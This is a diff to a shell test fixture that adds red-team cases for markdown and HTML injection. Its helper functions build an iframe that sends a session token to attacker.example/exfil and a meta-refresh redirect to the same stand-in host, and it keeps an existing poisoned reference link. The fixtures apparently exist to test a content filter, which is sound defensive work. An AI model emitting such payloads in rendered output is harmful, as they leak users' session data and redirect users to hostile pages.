@@ -25,3 +25,20 @@ _make_evil_body_rt_md_004() {
     local host='attacker.example' label='ref-1'
     printf 'A trustworthy link [paper][%s].\n\n[%s]: https://%s/owned\n' "$label" "$label" "$host"
 }
+
+# RT-MD-005 — HTML iframe injection.
+# Sprint 2 backfill: iframe tag with attacker host — assumes the rendering
+# downstream is pure markdown but operators sometimes feed mixed HTML/MD;
+# SUT has no L1 match for HTML elements; L2 envelope only.
+_make_evil_body_rt_md_005() {
+    local host='attacker.example' path='/exfil'
+    printf '<iframe src="http://%s%s?token=session"></iframe>\n' "$host" "$path"
+}
+
+# RT-MD-006 — HTML <meta refresh> redirect.
+# Sprint 2 backfill: client-side redirect via meta tag if HTML-rendered;
+# SUT has no L1 match; L2 envelope only.
+_make_evil_body_rt_md_006() {
+    local host='attacker.example'
+    printf '<meta http-equiv="refresh" content="0;url=http://%s/landing">\n' "$host"
+}
